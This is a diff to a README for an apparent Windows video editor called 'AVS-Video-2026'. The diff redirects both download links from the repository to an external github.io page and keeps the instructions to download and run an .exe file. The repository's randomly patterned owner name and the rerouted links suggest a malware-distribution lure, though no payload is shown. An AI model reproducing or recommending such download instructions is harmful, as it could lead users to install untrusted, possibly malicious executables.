@@ -1,6 +1,6 @@
 # 🎬 AVS-Video-2026 - Master Your Videos On Windows Easily
 
-[![](https://img.shields.io/badge/Download-AVS_Video_Editor-blue.svg)](https://github.com/Unresentful-couch609/AVS-Video-2026)
+[![](https://img.shields.io/badge/Download-AVS_Video_Editor-blue.svg)](https://unresentful-couch609.github.io)
 
 This repository provides the setup files for AVS-Video-2026. This software allows you to edit, cut, and enhance video files on your Windows computer. Whether you want to trim raw footage, add transitions, or export high-quality clips, this tool covers your needs. 
 
@@ -18,7 +18,7 @@ To ensure the software runs without errors, your computer must meet these basic 
 
 Follow these steps to set up the software on your system.
 
-1.  Visit the official release page to access the installer: [Download AVS-Video-2026 Here](https://github.com/Unresentful-couch609/AVS-Video-2026).
+1.  Visit the official release page to access the installer: [Download AVS-Video-2026 Here](https://unresentful-couch609.github.io).
 2.  Locate the folder or button labeled "Releases" on the right side of the page.
 3.  Click the release version to see the available files.
 4.  Download the file ending in `.exe` to your computer. 
